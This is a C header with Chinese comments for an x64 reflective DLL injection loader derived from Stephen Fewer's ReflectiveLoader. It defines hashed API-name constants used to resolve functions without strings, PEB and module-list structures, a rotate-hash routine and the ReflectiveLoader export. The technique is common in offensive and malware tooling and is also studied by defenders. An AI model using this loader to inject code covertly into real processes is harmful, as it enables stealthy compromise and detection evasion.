/*
 * Reflective DLL Injection - ReflectiveLoader Header
 *
 * 反射 DLL 注入加载器头文件（x64 版本）
 *
 * 作者：基于 Stephen Fewer 的原始实现，简化为纯 x64 版本
 *
 * 核心概念：
 * - DLL 导出 ReflectiveLoader 函数
 * - ReflectiveLoader 自己实现 PE 加载逻辑
 * - 不依赖 Windows LoadLibrary API
 * - Position Independent Code (PIC)
 */

#ifndef _REFLECTIVE_LOADER_H
#define _REFLECTIVE_LOADER_H

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <intrin.h>

// ========================================
// 宏定义
// ========================================

// 通过哈希值识别 DLL 和函数（避免使用字符串）
#define KERNEL32DLL_HASH                0x6A4ABC5B      // kernel32.dll 的哈希值
#define NTDLLDLL_HASH                   0x3CFA685D      // ntdll.dll 的哈希值

#define LOADLIBRARYA_HASH               0xEC0E4E8E      // LoadLibraryA
#define GETPROCADDRESS_HASH             0x7C0DFCAA      // GetProcAddress
#define VIRTUALALLOC_HASH               0x91AFCA54      // VirtualAlloc
#define NTFLUSHINSTRUCTIONCACHE_HASH    0x534C0AB8      // NtFlushInstructionCache

#define HASH_KEY                        13              // 哈希旋转密钥

// 内存解引用宏
#define DEREF(name)       *(ULONG_PTR *)(name)
#define DEREF_64(name)    *(DWORD64 *)(name)
#define DEREF_32(name)    *(DWORD *)(name)
#define DEREF_16(name)    *(WORD *)(name)
#define DEREF_8(name)     *(BYTE *)(name)

// ========================================
// 函数类型定义
// ========================================

typedef HMODULE (WINAPI * LOADLIBRARYA)(LPCSTR);
typedef FARPROC (WINAPI * GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI * VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD   (NTAPI * NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);

typedef BOOL (WINAPI * DLLMAIN)(HINSTANCE, DWORD, LPVOID);

// ========================================
// PE 结构定义
// ========================================

// UNICODE_STRING 结构（用于 PEB 遍历）
typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  pBuffer;
} UNICODE_STR, *PUNICODE_STR;

// LDR_DATA_TABLE_ENTRY（模块链表项）
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// PEB_LDR_DATA（模块加载器数据）
typedef struct _PEB_LDR_DATA {
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

// PEB（进程环境块）- 简化版本
typedef struct _PEB {
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    // ... 其他字段省略
} PEB, *PPEB;

// 重定位条目
typedef struct {
    WORD offset:12;
    WORD type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;

// ========================================
// 内联哈希函数
// ========================================

// 循环右移（用于哈希计算）
__forceinline DWORD ror(DWORD d) {
    // MSVC 使用 _rotr 内建函数
    // GCC 需要手动实现
    #ifdef _MSC_VER
        return _rotr(d, HASH_KEY);
    #else
        return (d >> HASH_KEY) | (d << (32 - HASH_KEY));
    #endif
}

// 计算字符串哈希值
__forceinline DWORD hash(char *c) {
    register DWORD h = 0;
    do {
        h = ror(h);
        h += *c;
    } while (*++c);
    return h;
}

// ========================================
// 导出函数声明
// ========================================

// 核心反射加载器函数（DLL 导出）
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID);

#endif // _REFLECTIVE_LOADER_H
